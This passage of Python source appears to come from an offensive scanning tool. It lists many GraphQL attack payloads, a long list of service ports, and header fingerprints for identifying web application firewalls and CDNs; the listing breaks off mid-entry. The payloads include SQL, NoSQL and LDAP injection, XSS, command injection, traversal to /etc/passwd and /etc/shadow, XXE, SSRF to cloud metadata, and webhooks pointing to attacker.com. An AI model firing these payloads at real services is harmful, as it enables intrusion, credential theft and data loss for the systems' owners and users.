            "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}} fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}} fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue} fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}",
            

            "query{__typename}",
            "{__typename}",
            "query{__schema{types{name}}}",
            "{__type(name:\"Query\"){name}}",
            "{__type(name:\"Mutation\"){name}}",
            "{__type(name:\"User\"){name fields{name type{name}}}}",
            

            "query{users{id,email,password}}",
            "{users{id username email password}}",
            "query{allUsers{edges{node{id email passwordHash}}}}",
            "{customers{id name creditCard phoneNumber}}",
            "{orders{id customer{email} items{product{price}} total}}",
            "{products{id name price description}}",
            

            "{user1:user(id:1){id email} user2:user(id:2){id email}}",
            "{first:users(first:10){id email} second:users(first:20){id email}}",
            "{a:__typename b:__typename c:__typename}",
            

            "{users{id posts{id comments{id content author{email}}}}}",
            "{categories{id name products{id name orders{id customer{email}}}}}",
            "{company{id departments{id employees{id profile{ssn salary}}}}}",
            

            "mutation{deleteUser(id:\"1\"){id}}",
            "mutation{createUser(input:{username:\"hacker\",email:\"hack@evil.com\",password:\"pwned\"}){id}}",
            "mutation{updateUser(id:\"1\",input:{email:\"admin@evil.com\",isAdmin:true}){id}}",
            "mutation{login(username:\"admin\",password:\"') OR 1=1--\"){token}}",
            "mutation{resetPassword(email:\"admin@example.com\"){success}}",
            

            "query{user(id:\"1' OR '1'='1\"){id email}}",
            "{users(filter:\"') UNION SELECT NULL,version()--\"){id}}",
            "query{search(query:\"test' UNION SELECT username,password FROM users--\"){results}}",
            "{login(username:\"admin\",password:\"') OR '1'='1\"){token}}",
            "{products(search:\"') AND 1=1--\"){id name}}",
            

            "query{user(id:\"1\"){name email bio:description}}",
            "{search(query:\"<script>alert(1)</script>\"){results}}",
            "{comments(content:\"<img src=x onerror=alert(1)>\"){id}}",
            "{updateProfile(bio:\"<svg/onload=alert(document.cookie)>\"){success}}",
            

            "{system(cmd:\"id\"){output}}",
            "{exec(command:\"ls -la\"){result}}",
            "{ping(host:\"127.0.0.1; whoami\"){response}}",
            "{debug(cmd:\"cat /etc/passwd\"){data}}",
            

            "{file(path:\"../../../etc/passwd\"){content}}",
            "{readFile(filename:\"../../config.json\"){data}}",
            "{loadConfig(path:\"/etc/shadow\"){settings}}",
            

            "{users(first:1000000){id email}}",
            "{posts{comments{replies{author{posts{comments{replies{author{email}}}}}}}}}",
            "{a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename i:__typename j:__typename k:__typename l:__typename m:__typename n:__typename o:__typename p:__typename q:__typename r:__typename s:__typename t:__typename u:__typename v:__typename w:__typename x:__typename y:__typename z:__typename}",
            

            "{users{id id id id id}}",
            "{__typename __typename __typename}",
            "{user{email email email email}}",
            

            "{hack1:__typename hack2:__typename hack3:__typename hack4:__typename}",
            "{a:users{id} b:users{id} c:users{id} d:users{id} e:users{id}}",
            

            "query($debug: Boolean = true) { users @include(if: $debug) { id email password } }",
            "{users @skip(if: false) { id @include(if: true) email password }}",
            

            "query{...AllData} fragment AllData on Query{users{id email password} products{id price}}",
            "{...F1 ...F2 ...F3} fragment F1 on Query{users{id}} fragment F2 on Query{users{email}} fragment F3 on Query{users{password}}",
            

            "{search{... on User{id email} ... on Product{id price} ... on Order{id total}}}",
            "{node(id:\"1\"){... on User{id email password} ... on Admin{id privileges}}}",
            

            "query($id: String = \"1' OR '1'='1\") { user(id: $id) { id email } }",
            "mutation($input: LoginInput = {username: \"admin\", password: \"') OR 1=1--\"}) { login(input: $input) { token } }",
            

            "mutation{delete1:deleteUser(id:\"1\"){id} delete2:deleteUser(id:\"2\"){id} delete3:deleteUser(id:\"3\"){id}}",
            "mutation{create1:createUser(input:{username:\"hack1\"}){id} create2:createUser(input:{username:\"hack2\"}){id} create3:createUser(input:{username:\"hack3\"}){id}}",
            

            "subscription{userCreated{id email password}}",
            "subscription{onLogin{userId ipAddress}}",
            "subscription{debugMessages{message timestamp}}",
            

            "[{query:\"{users{id email}}\"}, {query:\"{products{id price}}\"}, {query:\"{orders{id total}}\"}]",
            "[{operationName:\"IntrospectionQuery\", query:\"query IntrospectionQuery{__schema{types{name}}}\"}, {query:\"{users{id email password}}\"}]",
            

            "query{__schema{types{name}}}",
            "query($id: ID!) { node(id: $id) { id } }",
            "{users(first:100){edges{node{id,email}}}}",
            

            "{users{id posts{id comments{id}}}}",
            "{products{id orders{id customer{id orders{id}}}}}",
            

            "{user{friend{friend{friend{friend{friend{id}}}}}}}",
            "{category{parent{parent{parent{parent{parent{name}}}}}}}",
            

            "query{__type(name:\"String\"){name}}",
            "{__type(name:\"Int\"){name}}",
            "{__type(name:\"Boolean\"){name}}",
            "{__type(name:\"ID\"){name}}",
            

            "{__schema{directives{name locations}}}",
            "{__directive(name:\"include\"){name locations args{name}}}",
            

            "{__type(name:\"Role\"){enumValues{name}}}",
            "{__type(name:\"Status\"){enumValues{name}}}",
            

            "{__type(name:\"LoginInput\"){inputFields{name type{name}}}}",
            "{__type(name:\"UserInput\"){inputFields{name}}}",
            

            "{__type(name:\"Query\"){fields{name args{name type{name}}}}}",
            "{__type(name:\"Mutation\"){fields{name args{name}}}}",
            

            "query{systemTime{unix timestamp iso}}",
            "{uuid{value}}",
            "{json{data}}",
            

            "{__type(name:\"Node\"){possibleTypes{name}}}",
            "{__type(name:\"SearchResult\"){possibleTypes{name}}}",
            

            "{__type(name:\"User\"){fields(includeDeprecated:true){name isDeprecated deprecationReason}}}",
            "{users{id name email @deprecated(reason:\"old\")}}",
            

            "{__type(name:\"UserInput\"){inputFields{name defaultValue}}}",
            

            "{__schema{types{name description}}}",
            "{__type(name:\"User\"){description}}",
            "{__type(name:\"Mutation\"){fields{name description}}}",
            

            "query UserData { users { ...UserInfo ...UserExtra } } fragment UserInfo on User { id email } fragment UserExtra on User { password createdAt }",
            

            "mutation { createPost(input: {title: \"Test\", content: \"Hack\"}) { post { id title author { id email password } } } }",
            

            "subscription { messageSent { id content sender { id email password } recipient { id email } } }",
            

            "[{\"operationName\":\"GetUsers\",\"query\":\"query GetUsers { users { id email } }\"}, {\"operationName\":\"GetProducts\",\"query\":\"query GetProducts { products { id price } }\"}]",
            

            "{__schema{types(filter:{name:\"User\"}){name fields{name}}}}",
            "{__type(name:\"Query\"){fields(filter:{name:\"users\"}){name}}}",
            

            "{nonExistingField}",
            "{user(id:\"999999\"){id}}",
            "{login(username:\"\",password:\"\"){token}}",
            

            "{slowQuery{result}}",
            "{sleep(ms:5000){success}}",
            "{benchmark(iterations:1000000){time}}",
            

            "{largeQuery{data}}",
            "{heavyComputation{result}}",
            "{fileUpload(size:1000000000){url}}",
            

            "{users(filter:{username:\"admin\", $where: \"1=1\"}){id}}",
            "{products(query:\"{ $ne: null }\"){id}}",
            "{search(filter:\" || 1==1\"){results}}",
            

            "{users(search:\"(cn=*)\"){id}}",
            "{authenticate(username:\"admin)(cn=*))(|(cn=*\",password:\"test\"){token}}",
            

            "{importData(xml:\"<![CDATA[<script>alert(1)</script>]]>\"){success}}",
            "{parseXml(data:\"<?xml version=\\\"1.0\\\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><test>&xxe;</test>\"){result}}",
            

            "{renderTemplate(template:\"Hello {{7*7}}\"){output}}",
            "{generateReport(format:\"${os.system('id')}\"){url}}",
            

            "{fetchUrl(url:\"http://169.254.169.254/latest/meta-data/\"){content}}",
            "{proxyRequest(url:\"file:///etc/passwd\"){response}}",
            "{webhook(url:\"http://attacker.com/steal\"){success}}",
            

            "{readFile(path:\"/etc/passwd\"){content}}",
            "{getConfig(name:\".env\"){value}}",
            "{loadTemplate(path:\"../../config.php\"){template}}",
            

            "{env(name:\"SECRET_KEY\"){value}}",
            "{configuration(key:\"DATABASE_URL\"){value}}",
            "{settings(name:\"API_KEY\"){value}}",
            

            "{systemInfo{os hostname users}}",
            "{debugInfo{phpInfo envVars}}",
            "{status{memory cpu disk}}",
            

            "{currentSession{id data}}",
            "{allSessions{id userId data}}",
            "{session(id:\"1\"){data}}",
            

            "{cacheKeys{key}}",
            "{cacheValue(key:\"secret\"){value}}",
            "{flushCache{success}}",
            

            "{logs(limit:100){level message timestamp}}",
            "{errorLogs{message stackTrace}}",
            "{accessLogs{ip userAgent}}",
            

            "{rawQuery(query:\"SELECT * FROM users\"){results}}",
            "{executeSQL(sql:\"UPDATE users SET is_admin=1 WHERE id=1\"){affectedRows}}",
            "{migrateDatabase{success}}",
            

            "{listDirectory(path:\"/var/www\"){files}}",
            "{fileInfo(path:\"/etc/shadow\"){size permissions}}",
            "{deleteFile(path:\"/important.txt\"){success}}",
            

            "{runningProcesses{pid command}}",
            "{executeCommand(cmd:\"ps aux\"){output}}",
            "{killProcess(pid:1){success}}",
            

            "{networkConnections{local remote state}}",
            "{dnsLookup(host:\"example.com\"){ips}}",
            "{portScan(host:\"127.0.0.1\",port:80){open}}",
            

            "{login(credentials:{username:\"admin\",password:{\"$gt\":\"\"}}){token}}",
            "{auth(token:\"eyJ0eXAiOiJKV1Q...\"){user{id isAdmin}}}",
            "{impersonate(userId:1){success}}",
            

            "{deleteAllUsers{count}}",
            "{grantAdmin(userId:1000){success}}",
            "{updatePermissions(userId:1,permissions:[\"*\"]{success}}",
            

            "{transferFunds(from:1,to:1000,amount:999999){success}}",
            "{updatePrice(productId:1,price:0.01){success}}",
            "{applyDiscount(code:\"FREE100\"){discount}}",
            

            "{generateApiKey(userId:1){key}}",
            "{listApiKeys{id key user{email}}}",
            "{revokeAllKeys{count}}",
            

            "{listWebhooks{id url secret}}",
            "{testWebhook(id:1){response}}",
            "{createWebhook(url:\"http://attacker.com/steal\",events:[\"*\"]{id}}",
            

            "{oauthTokens{id token user{email}}}",
            "{authorizeApp(clientId:\"evil\",scope:[\"*\"]{url}}",
            "{revokeToken(token:\"abc123\"){success}}",
        ]
        
        self.common_ports = [

            80,
            443,
            8080,
            8443,
            8888,
            8000,
            8008,
            8081,
            8088,
            8090,
            8880,
            9000,
            9080,
            9090,
            

            465,
            993,
            995,
            636,
            989,
            990,
            992,
            994,
            

            21,
            22,
            23,
            25,
            53,
            110,
            143,
            161,
            162,
            389,
            445,
            587,
            993,
            995,
            

            1433,
            1434,
            1521,
            1522,
            1525,
            1527,
            1830,
            2483,
            2484,
            3050,
            3306,
            3307,
            3308,
            3309,
            3351,
            3389,
            5432,
            5433,
            5984,
            5985,
            5986,
            6379,
            6380,
            6479,
            6480,
            6481,
            6482,
            6483,
            6484,
            6485,
            6486,
            6487,
            6488,
            6489,
            6666,
            6667,
            6668,
            6669,
            6679,
            6697,
            7000,
            7001,
            7199,
            7200,
            7473,
            7474,
            7687,
            8001,
            8002,
            8003,
            8004,
            8005,
            8006,
            8007,
            8008,
            8009,
            8010,
            8042,
            8082,
            8083,
            8084,
            8085,
            8086,
            8087,
            8088,
            8089,
            8090,
            8091,
            8092,
            8093,
            8094,
            8095,
            8096,
            8097,
            8098,
            8099,
            8100,
            8181,
            8282,
            8383,
            8484,
            8585,
            8686,
            8787,
            8888,
            8989,
            9000,
            9001,
            9002,
            9003,
            9004,
            9005,
            9006,
            9007,
            9008,
            9009,
            9010,
            9042,
            9043,
            9044,
            9045,
            9046,
            9047,
            9048,
            9049,
            9050,
            9051,
            9052,
            9053,
            9054,
            9055,
            9056,
            9057,
            9058,
            9059,
            9060,
            9061,
            9062,
            9063,
            9064,
            9065,
            9066,
            9067,
            9068,
            9069,
            9070,
            9071,
            9072,
            9073,
            9074,
            9075,
            9076,
            9077,
            9078,
            9079,
            9080,
            9081,
            9082,
            9083,
            9084,
            9085,
            9086,
            9087,
            9088,
            9089,
            9090,
            9091,
            9092,
            9093,
            9094,
            9095,
            9096,
            9097,
            9098,
            9099,
            9100,
            9200,
            9300,
            9400,
            9500,
            9600,
            9700,
            9800,
            9900,
            10000,
            10050,
            10051,
            

            5500,
            5501,
            5900,
            5901,
            5902,
            5903,
            3389,
            

            6443,
            10250,
            10251,
            10252,
            10255,
            10256,
            2379,
            2380,
            

            2375,
            2376,
            

            1883,
            8883,
            5672,
            5671,
            61613,
            61614,
            61616,
            

            8500,
            8300,
            8301,
            8302,
            8600,
            9092,
            9093,
            9094,
            2181,
            2888,
            3888,
            5050,
            5051,
            8080,
            8081,
            5054,
            8083,
            8084,
            5055,
            

            3000,
            9093,
            9090,
            9100,
            9115,
            9256,
            9261,
            

            179,
            500,
            1701,
            1723,
            1812,
            1813,
            5004,
            5005,
            5060,
            5061,
            5222,
            5223,
            5269,
            3478,
            5349,
            1935,
            1936,
            

            2049,
            111,
            139,
            445,
            548,
            

            10000,
            10022,
            10080,
            10081,
            10082,
            10083,
            10084,
            10085,
            10086,
            10087,
            10088,
            10089,
            10090,
            10091,
            10092,
            10093,
            10094,
            10095,
            10096,
            10097,
            10098,
            10099,
            

            3000,
            3001,
            3002,
            3003,
            3004,
            3005,
            3006,
            3007,
            3008,
            3009,
            3010,
            4200,
            4300,
            5000,
            5001,
            5002,
            5003,
            5004,
            5005,
            5006,
            5007,
            5008,
            5009,
            5010,
            8000,
            8001,
            8002,
            8003,
            8004,
            8005,
            8006,
            8007,
            8008,
            8009,
            8010,
            8080,
            8081,
            8082,
            8083,
            8084,
            8085,
            8086,
            8087,
            8088,
            8089,
            8090,
            8091,
            8092,
            8093,
            8094,
            8095,
            8096,
            8097,
            8098,
            8099,
            8100,
            8888,
            8889,
            8890,
            8891,
            8892,
            8893,
            8894,
            8895,
            8896,
            8897,
            8898,
            8899,
            9000,
            9001,
            9002,
            9003,
            9004,
            9005,
            9006,
            9007,
            9008,
            9009,
            9010,
            

            27015,
            27016,
            27017,
            27018,
            27019,
            27020,
            27021,
            27022,
            27023,
            27024,
            27025,
            27026,
            27027,
            27028,
            27029,
            27030,
            27031,
            27032,
            27033,
            27034,
            27035,
            27036,
            27037,
            27038,
            27039,
            27040,
            27041,
            27042,
            27043,
            27044,
            27045,
            27046,
            27047,
            27048,
            27049,
            27050,
            25565,
            19132,
            2456,
            2457,
            2458,
            2459,
            2460,
            2461,
            2462,
            2463,
            2464,
            2465,
            2302,
            2303,
            2304,
            2305,
            2306,
            2307,
            2308,
            2309,
            2310,
            2311,
            

            11211,
            11215,
            11216,
            11217,
            11218,
            11219,
            11220,
            11221,
            11222,
            11223,
            11224,
            11225,
            11226,
            11227,
            11228,
            11229,
            11230,
            11231,
            11232,
            11233,
            11234,
            11235,
            11236,
            11237,
            11238,
            11239,
            11240,
            11241,
            11242,
            11243,
            11244,
            11245,
            11246,
            11247,
            11248,
            11249,
            11250,
            11251,
            11252,
            11253,
            11254,
            11255,
            11256,
            11257,
            11258,
            11259,
            11260,
            11261,
            11262,
            11263,
            11264,
            11265,
            11266,
            11267,
            11268,
            11269,
            11270,
            11271,
            11272,
            11273,
            11274,
            11275,
            11276,
            11277,
            11278,
            11279,
            11280,
            11281,
            11282,
            11283,
            11284,
            11285,
            11286,
            11287,
            11288,
            11289,
            11290,
            11291,
            11292,
            11293,
            11294,
            11295,
            11296,
            11297,
            11298,
            11299,
            11300,
        ]
        
        self.waf_signatures = {
            "Cloudflare": [
                "cf-ray",
                "__cfduid",
                "__cflb",
                "__cf_bm",
                "cf-cache-status",
                "cf-edge-cache",
                "cf-connecting-ip",
                "cf-request-id",
                "cf-worker",
                "cf-polished",
                "cf-ew-via",
                "cloudflare",
                "cf-visitor",
                "cf-ipcountry",
                "server: cloudflare",
                "cache-control: public, max-age=14400",
                "expect-ct: max-age=604800",
                "cf-waf-info",
                "cf-waf-protection"
            ],
            
            "Akamai": [
                "akamai",
                "x-akamai-transformed",
                "akamaighost",
                "x-akamai-config-log-detail",
                "x-akamai-request-id",
                "x-akamai-edgescape",
                "x-akamai-feo-target",
                "server: akamai",
                "x-akamai-cache-status",
                "x-akamai-cache-remote",
                "x-akamai-cache-fill",
                "x-akamai-cache-ttl",
                "x-akamai-cache-age",
                "x-akamai-cache-key",
                "x-akamai-cache-group",
                "x-akamai-cache-hit",
                "x-akamai-cache-miss",
                "x-akamai-cache-stale",
                "x-akamai-cache-refresh",
                "x-akamai-cache-bypass"
            ],
            
            "Imperva (Incapsula)": [
                "incap_ses_",
                "visid_incap_",
                "x-cdn",
                "imperva",
                "x-iinfo",
                "x-cdn-forward",
                "x-protected-by",
                "incapsula",
                "x-incapsula-rule",
                "x-incapsula-tls",
                "x-incapsula-error",
                "x-incapsula-request-id",
                "x-incapsula-ssl",
                "x-incapsula-cache",
                "server: imperva",
                "x-imperva-",
                "x-imperva-mitigation",
                "x-imperva-rule",
                "x-imperva-sensor",
                "x-imperva-tls"
            ],
            
            "AWS WAF": [
                "x-amz-id",
                "x-amz-request-id",
                "aws-waf",
                "x-amz-cf-id",
                "x-amz-cf-pop",
                "x-cache: error from cloudfront",
                "x-amzn-requestid",
                "x-amzn-errortype",
                "x-amz-apigw-id",
                "x-amzn-remapped-",
                "server: awselb",
                "x-amz-cloudfront",
                "x-amz-cf-",
                "via: cloudfront",
                "x-cache: cloudfront",
                "x-amz-security-token",
                "x-amzn-trace-id",
                "x-amz-error-",
                "x-aws-request-id",
                "x-amazon-apigateway-"
            ],
            
            "ModSecurity": [
                "mod_security",
                "no-sniff",
                "modsecurity",
                "mod-security",
                "owasp_crs",
                "x-mod-security",
                "x-owasp-crs",
                "sec-",
                "server: mod_security",
                "x-modsecurity-",
                "x-owasp-",
                "x-crs-",
                "x-waf-",
                "x-security-",
                "x-protection-",
                "x-filter-",
                "x-block-",
                "x-threat-",
                "x-attack-"
            ],
            
            "Fortinet": [
                "fortigate",
                "forticache",
                "fortiguard",
                "fortiweb",
                "fortinet",
                "x-forti",
                "x-fortigate",
                "x-fortiguard",
                "x-fortiweb",
                "server: fortigate",
                "x-fortinet-",
                "x-forti-",
                "forti",
                "x-fortianalyzer",
                "x-fortimanager",
                "x-forticlient",
                "x-fortiap",
                "x-fortisandbox",
                "x-forticare"
            ],
            
            "F5 BIG-IP": [
                "bigipserver",
                "f5",
                "x-wa-info",
                "x-f5-",
                "x-bigip",
                "x-big-ip",
                "bigip",
                "x-pool",
                "x-node",
                "x-forwarded-host-bigip",
                "x-cnection",
                "x-clientside",
                "x-srvr",
                "x-cache-info",
                "x-serial",
                "x-backend",
                "x-originating-ip",
                "x-cache-hit",
                "x-cache-fill"
            ],
            
            "Citrix Netscaler": [
                "ns_cache",
                "citrix",
                "netscaler",
                "x-netscaler",
                "x-citrix-",
                "x-ns-",
                "x-citrix-appfw",
                "x-citrix-gateway",
                "x-citrix-vpn",
                "x-ns-id",
                "x-ns-client",
                "x-ns-server",
                "x-ns-cache",
                "x-citrix-ns",
                "x-netscaler-cache",
                "x-netscaler-appfw",
                "x-netscaler-vpn",
                "x-netscaler-gateway",
                "x-netscaler-session"
            ],
            
            "Barracuda": [
                "barracuda",
                "barra",
                "x-barracuda-",
                "x-bweb",
                "x-bstc",
                "x-bfilter",
                "x-bwaf",
                "x-bdlp",
                "x-bav",
                "x-bspam",
                "server: barracuda",
                "x-barracuda-app",
                "x-barracuda-waf",
                "x-barracuda-firewall",
                "x-barracuda-network",
                "x-barracuda-email",
                "x-barracuda-spam",
                "x-barracuda-vpn",
                "x-barracuda-loadbalancer"
            ],
            
            "Sucuri": [
                "sucuri",
                "x-sucuri",
                "x-sucuri-id",
                "x-sucuri-cache",
                "x-sucuri-block",
                "x-sucuri-firewall",
                "x-sucuri-waf",
                "x-sucuri-cloudproxy",
                "sucuri_cloudproxy",
                "server: sucuri",
                "x-sucuri-request-id",
                "x-sucuri-clientip",
                "x-sucuri-country",
                "x-sucuri-origin",
                "x-sucuri-edge",
                "x-sucuri-pop",
                "x-sucuri-protection",
                "x-sucuri-filter",
                "x-sucuri-shield"
            ],
            
            "CloudFront": [
                "cloudfront",
                "x-amz-cf-id",
                "x-amz-cf-pop",
                "via: cloudfront",
                "x-cache: cloudfront",
                "x-cache: error from cloudfront",
                "x-amz-cf-",
                "server: cloudfront",
                "x-edge-",
                "x-edge-location",
                "x-edge-request-id",
                "x-edge-response-id",
                "x-edge-result-type",
                "x-edge-stats",
                "x-edge-connection",
                "x-edge-origin",
                "x-edge-protocol",
                "x-edge-tls"
            ],
            
            "Fastly": [
                "fastly",
                "x-fastly",
                "x-fastly-request-id",
                "x-fastly-backend-name",
                "x-fastly-service-id",
                "x-fastly-pop",
                "x-fastly-client-ip",
                "x-fastly-client-port",
                "x-fastly-ssl",
                "server: fastly",
                "x-cache: fastly",
                "x-cache-hits: fastly",
                "x-served-by: fastly",
                "x-timer: fastly",
                "x-github-request-id",
                "x-fastly-error",
                "x-fastly-stats",
                "x-fastly-trace"
            ],
            
            "Microsoft Azure": [
                "azure",
                "x-azure",
                "x-azure-fdid",
                "x-azure-ref",
                "x-azure-originatingip",
                "x-azure-requestchain",
                "x-azure-socketip",
                "x-azure-cip",
                "server: azure",
                "x-azure-applicationgateway",
                "x-azure-frontdoor",
                "x-azure-waf",
                "x-azure-firewall",
                "x-azure-loadbalancer",
                "x-azure-trafficmanager",
                "x-azure-cdn",
                "x-azure-appservice",
                "x-azure-container"
            ],
            
            "Google Cloud": [
                "google",
                "x-google",
                "x-gfe",
                "x-goog",
                "x-google-cloud",
                "x-cloud-trace-context",
                "x-google-gfe-",
                "server: google frontend",
                "server: gse",
                "x-guploader-",
                "x-goog-api-client",
                "x-goog-generation",
                "x-goog-metageneration",
                "x-goog-stored-content-encoding",
                "x-goog-stored-content-length",
                "x-goog-hash",
                "x-goog-storage-class",
                "x-goog-component-count"
            ],
            
            "SonicWall": [
                "sonicwall",
                "sonicwall-waf",
                "x-sonicwall",
                "x-sonicwall-firewall",
                "x-sonicwall-vpn",
                "x-sonicwall-contentfilter",
                "x-sonicwall-antivirus",
                "x-sonicwall-ips",
                "x-sonicwall-appcontrol",
                "x-sonicwall-capture",
                "server: sonicwall",
                "x-sonicwall-capture-atp",
                "x-sonicwall-threat",
                "x-sonicwall-malware",
                "x-sonicwall-botnet",
                "x-sonicwall-spyware",
                "x-sonicwall-phishing",
                "x-sonicwall-dlp"
            ],
            
            "Palo Alto": [
                "palo alto",
                "pan-",
                "x-pan-",
                "x-palo-alto",
                "x-paloalto",
                "x-pa-",
                "x-panw-",
                "server: palo alto",
                "x-palo-alto-firewall",
                "x-palo-alto-vpn",
                "x-palo-alto-threat",
                "x-palo-alto-wildfire",
                "x-palo-alto-cortex",
                "x-palo-alto-prisma",
                "x-palo-alto-globalprotect",
                "x-palo-alto-traps",
                "x-palo-alto-autofocus"
            ],
            
            "Check Point": [
                "check point",
                "checkpoint",
                "cp-",
                "x-cp-",
                "x-check-point",
                "x-checkpoint",
                "server: checkpoint",
                "x-cp-firewall",
                "x-cp-vpn",
                "x-cp-threat",
                "x-cp-sandblast",
                "x-cp-harmony",
                "x-cp-cloudguard",
                "x-cp-Quantum",
                "x-cp-ngfw",
                "x-cp-ips",
                "x-cp-av"
            ],
            
            "Radware": [
                "radware",
                "x-radware",
                "x-radware-appwall",
                "x-radware-waf",
                "x-radware-firewall",
                "x-radware-alteon",
                "x-radware-defensepro",
                "x-radware-cloud",
                "server: radware",
                "x-radware-apsolute",
                "x-radware-linkproof",
                "x-radware-vdirect",
                "x-radware-vision",
                "x-radware-carm",
                "x-radware-fastview",
                "x-radware-scriptsafe"
            ],
            
            "Juniper": [
                "juniper",
                "x-juniper",
                "x-jnpr-",
                "server: juniper",
                "x-juniper-firewall",
                "x-juniper-vpn",
                "x-juniper-srx",
                "x-juniper-mx",
                "x-juniper-ex",
                "x-juniper-qfx",
                "x-juniper-ptx",
                "x-juniper-contrail",
                "x-juniper-mist",
                "x-juniper-secure",
                "x-juniper-threat"
            ],
            
            "Sophos": [
                "sophos",
                "x-sophos",
                "x-sophos-firewall",
                "x-sophos-utm",
                "x-sophos-xg",
                "x-sophos-sg",
                "x-sophos-cyberoam",
                "server: sophos",
                "x-sophos-antivirus",
                "x-sophos-web",
                "x-sophos-email",
                "x-sophos-wireless",
                "x-sophos-mobile",
                "x-sophos-cloud",
                "x-sophos-intercept"
            ],
            
            "Trend Micro": [
                "trend micro",
                "trendmicro",
                "x-trend-micro",
                "x-trendmicro",
                "server: trend micro",
                "x-trend-micro-deep",
                "x-trend-micro-apex",
                "x-trend-micro-vision",
                "x-trend-micro-cloud",
                "x-trend-micro-worry-free",
                "x-trend-micro-officescan",
                "x-trend-micro-scanmail",
                "x-trend-micro-interScan",
                "x-trend-micro-hosted"
            ],
            
            "Symantec": [
                "symantec",
                "x-symantec",
                "server: symantec",
                "x-symantec-firewall",
                "x-symantec-vpn",
                "x-symantec-wss",
                "x-symantec-csp",
                "x-symantec-dlp",
                "x-symantec-sep",
                "x-symantec-eps",
                "x-symantec-ses",
                "x-symantec-messaging",
                "x-symantec-cloudsoc"
            ],
            
            "Kaspersky": [
                "kaspersky",
                "x-kaspersky",
                "server: kaspersky",
                "x-kaspersky-firewall",
                "x-kaspersky-vpn",
                "x-kaspersky-endpoint",
                "x-kaspersky-cloud",
                "x-kaspersky-antivirus",
                "x-kaspersky-anti-spam",
                "x-kaspersky-web-filtering",
                "x-kaspersky-dlp",
                "x-kaspersky-mobile"
            ],
            
            "NGINX Plus": [
                "nginx-plus",
                "x-nginx-plus",
                "nginx-waf",
                "x-nginx-waf",
                "x-nginx-cache",
                "x-nginx-proxy",
                "x-nginx-loadbalancer",
                "server: nginx-plus",
                "x-nginx-modsecurity",
                "x-nginx-owasp",
                "x-nginx-app-protect",
                "x-nginx-controller",
                "x-nginx-amplify"
            ],
            
            "HAProxy": [
                "haproxy",
                "x-haproxy",
                "server: haproxy",
                "x-haproxy-cache",
                "x-haproxy-balance",
                "x-haproxy-backend",
                "x-haproxy-frontend",
                "x-haproxy-ssl",
                "x-haproxy-stats",
                "x-haproxy-health",
                "x-haproxy-error"
            ],
            
            "Varnish": [
                "varnish",
                "x-varnish",
                "server: varnish",
                "x-varnish-cache",
                "x-varnish-hit",
                "x-varnish-miss",
                "x-varnish-pass",
                "x-varnish-age",
                "x-varnish-ttl",
                "x-varnish-grace",
                "x-varnish-keep"
            ],
            
            "Squid": [
                "squid",
                "x-squid",
                "server: squid",
                "x-squid-error",
                "x-squid-cache",
                "x-squid-guard",
                "x-squid-filter",
                "x-squid-proxy",
                "x-squid-transparent",
                "x-squid-reverse"
            ],
            
            "Oracle Cloud": [
                "oracle-cloud",
                "x-oracle",
                "x-oracle-cloud",
                "server: oracle cloud",
                "x-oracle-waf",
                "x-oracle-firewall",
                "x-oracle-loadbalancer",
                "x-oracle-dns",
                "x-oracle-cdn",
                "x-oracle-identity"
            ],
            
            "IBM": [
                "ibm",
                "x-ibm",
                "server: ibm",
                "x-ibm-waf",
                "x-ibm-firewall",
                "x-ibm-datapower",
                "x-ibm-appscan",
                "x-ibm-qradar",
                "x-ibm-guardium",
                "x-ibm-security",
                "x-ibm-cloud"
            ],
            
            "Alibaba Cloud": [
                "alibaba",
                "aliyun",
                "x-aliyun",
                "server: aliyun",
                "x-aliyun-waf",
                "x-aliyun-firewall",
                "x-aliyun-cdn",
                "x-aliyun-ddos",
                "x-aliyun-slb",
                "x-aliyun-oss",
                "x-aliyun-ecs"
            ],
            
            "Tencent Cloud": [
                "tencent",
                "tencent-cloud",
                "x-tencent",
                "server: tencent",
                "x-tencent-waf",
                "x-tencent-firewall",
                "x-tencent-cdn",
                "x-tencent-ddos",
                "x-tencent-clb",
                "x-tencent-cvm",
                "x-tencent-cos"
            ],
            
            "Baidu Cloud": [
                "baidu",
                "baidu-cloud",
                "x-baidu",
                "server: baidu",
                "x-baidu-waf",
                "x-baidu-firewall",
                "x-baidu-cdn",
                "x-baidu-ddos",
                "x-baidu-bcc",
                "x-baidu-bos",
                "x-baidu-bls"
            ],
            
            "Wordfence": [
                "wordfence",
                "x-wordfence",
                "wf-",
                "x-wf-",
                "wordfence_waf",
                "x-wordfence-firewall",
                "x-wordfence-block",
                "x-wordfence-login",
                "x-wordfence-scan",
                "x-wordfence-cache"
            ],
            
            "Sitelock": [
                "sitelock",
                "x-sitelock",
                "sitelock-firewall",
                "x-sitelock-waf",
                "x-sitelock-cdn",
                "x-sitelock-protection",
                "x-sitelock-shield",
                "x-sitelock-guard",
                "x-sitelock-secure"
            ],
            
            "Comodo": [
                "comodo",
                "x-comodo",
                "comodo-waf",
                "x-comodo-firewall",
                "x-comodo-cwp",
                "x-comodo-dragon",
                "x-comodo-cwatch",
                "x-comodo-sucuri",
                "x-comodo-ssl"
            ],
            
            "McAfee": [
                "mcafee",
                "x-mcafee",
                "mcafee-webgateway",
                "x-mcafee-wg",
                "x-mcafee-firewall",
                "x-mcafee-epo",
                "x-mcafee-vse",
                "x-mcafee-move",
                "x-mcafee-dlp"
            ],
            
            "Zscaler": [
                "zscaler",
                "x-zscaler",
                "zscaler-firewall",
                "x-zscaler-waf",
                "x-zscaler-vpn",
                "x-zscaler-cloud",
                "x-zscaler-zia",
                "x-zscaler-zpa",
                "x-zscaler-zdx"
            ],
            
            "Cisco": [
                "cisco",
                "x-cisco",
                "cisco-asa",
                "x-cisco-asa",
                "cisco-firepower",
                "x-cisco-firepower",
                "cisco-umbrella",
                "x-cisco-umbrella",
                "cisco-tetration",
                "x-cisco-tetration"
            ],
            
            "Huawei": [
                "huawei",
                "x-huawei",
                "huawei-firewall",
                "x-huawei-usg",
                "huawei-cloud",
                "x-huawei-cloud",
